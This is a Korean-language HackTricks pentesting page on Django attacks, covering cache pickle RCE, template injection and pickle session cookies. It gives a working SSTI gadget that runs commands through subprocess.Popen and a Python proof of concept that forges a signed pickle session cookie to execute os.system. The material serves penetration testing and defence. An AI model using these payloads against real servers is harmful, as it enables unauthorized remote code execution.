# Django

{{#include ../../banners/hacktricks-training.md}}

## Cache Manipulation to RCE
Django의 기본 캐시 저장 방식은 [Python pickles](https://docs.python.org/3/library/pickle.html)이며, [untrusted input is unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf)될 경우 RCE로 이어질 수 있습니다. **공격자가 캐시에 쓰기 권한을 얻을 수 있다면, 이 취약점을 기저 서버에서 RCE로 확대할 수 있습니다**.

Django 캐시는 네 곳 중 하나에 저장됩니다: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), 또는 [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95)에 저장됩니다. Redis 서버나 데이터베이스에 저장된 캐시는 가장 가능성 높은 공격 벡터(Redis injection 및 SQL injection)이며, 파일 기반 캐시를 이용해 임의의 쓰기를 RCE로 전환할 수도 있습니다. 메인테이너들은 이를 non-issue로 표시했습니다. 캐시 파일 폴더, SQL 테이블 이름, Redis 서버 세부 정보는 구현에 따라 달라진다는 점에 유의하세요.

이 HackerOne 리포트는 SQLite 데이터베이스에 저장된 Django 캐시를 악용하는 훌륭하고 재현 가능한 예시를 제공합니다: https://hackerone.com/reports/1415436

---

## Server-Side Template Injection (SSTI)
The Django Template Language (DTL) is **Turing-complete**. 사용자 제공 데이터가 *template string*으로 렌더링되는 경우(예: `Template(user_input).render()`를 호출하거나 `|safe`/`format_html()`이 자동 이스케이프를 제거할 때), 공격자는 SSTI를 통해 RCE를 달성할 수 있습니다.

### 탐지
1. `Template()` / `Engine.from_string()` / `render_to_string()` 같은 동적 호출에서 요청 데이터의 어떤 부분이라도 검증되지 않은 상태로 포함되는지 찾아보세요.
2. 시간 기반 또는 산술 페이로드를 전송하세요:
```django
{{7*7}}
```
렌더된 출력에 `49`가 포함되어 있다면 입력은 템플릿 엔진에 의해 컴파일된 것입니다.

### Primitive to RCE
Django는 `__import__`에 대한 직접 접근을 차단하지만, Python object graph에는 접근할 수 있습니다:
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
`subprocess.Popen`의 인덱스(파이썬 빌드에 따라 ≈400–500)를 찾아 임의의 명령을 실행합니다:
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
더 안전한 범용 gadget은 `cls.__name__ == 'Popen'`이 될 때까지 반복(iterate)하는 것입니다.

같은 gadget은 사용자 입력을 잘못 처리하는 **Debug Toolbar** 또는 **Django-CMS**의 템플릿 렌더링 기능에서도 작동합니다.

---

### Also see: ReportLab/xhtml2pdf PDF export RCE
Django 기반 애플리케이션은 보통 뷰를 PDF로 내보내기 위해 xhtml2pdf/ReportLab을 통합합니다. 사용자가 제어하는 HTML이 PDF 생성으로 흘러들어가면, rl_safe_eval이 삼중 괄호 `[[[ ... ]]]` 안의 표현식을 평가해 코드 실행을 가능하게 할 수 있습니다 (CVE-2023-33733). Details, payloads, and mitigations:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

---

## Pickle-Backed Session Cookie RCE
설정 `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'`가 활성화되어 있거나(pickle을 deserialize하는 커스텀 serializer인 경우), Django는 어떤 view 코드도 호출하기 전에 세션 쿠키를 *decrypts and unpickles* 합니다. 따라서 유효한 signing key(기본적으로 프로젝트 `SECRET_KEY`)를 보유하고 있으면 즉시 원격 코드 실행이 가능합니다.

### Exploit Requirements
* 서버가 `PickleSerializer`를 사용합니다.
* 공격자가 `settings.SECRET_KEY`를 알고 있거나 추측할 수 있습니다 (leaks via GitHub, `.env`, error pages, etc.).

### Proof-of-Concept
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
결과 cookie를 전송하면, payload는 WSGI worker 권한으로 실행됩니다.

**완화책**: 기본 `JSONSerializer`를 유지하고, `SECRET_KEY`를 주기적으로 교체하며, `SESSION_COOKIE_HTTPONLY`를 설정하세요.

---

## 최근(2023-2025) 높은 영향도의 Django CVE — Pentesters가 확인해야 할 항목
* **CVE-2025-48432** – *Log Injection via unescaped `request.path`* (fixed June 4 2025). 공격자가 newlines/ANSI codes를 로그 파일에 주입하여 하류의 로그 분석을 오염시킬 수 있습니다. Patch level ≥ 4.2.22 / 5.1.10 / 5.2.2.
* **CVE-2024-42005** – *Critical SQL injection* in `QuerySet.values()/values_list()` on `JSONField` (CVSS 9.8). JSON 키를 조작해 인용부호를 탈출하고 임의의 SQL을 실행할 수 있습니다. Fixed in 4.2.15 / 5.0.8.

항상 `X-Frame-Options` 오류 페이지나 `/static/admin/css/base.css` 해시를 통해 정확한 프레임워크 버전을 식별하고, 해당되는 경우 위 항목들을 테스트하세요.

---

## 참고자료
* Django 보안 릴리스 – "Django 5.2.2, 5.1.10, 4.2.22 address CVE-2025-48432" – 2025년 6월 4일.
* OP-Innovate: "Django releases security updates to address SQL injection flaw CVE-2024-42005" – 2024년 8월 11일.
* 0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE and pivot into AD – [https://0xdf.gitlab.io/2025/08/09/htb-university.html](https://0xdf.gitlab.io/2025/08/09/htb-university.html)

{{#include ../../banners/hacktricks-training.md}}
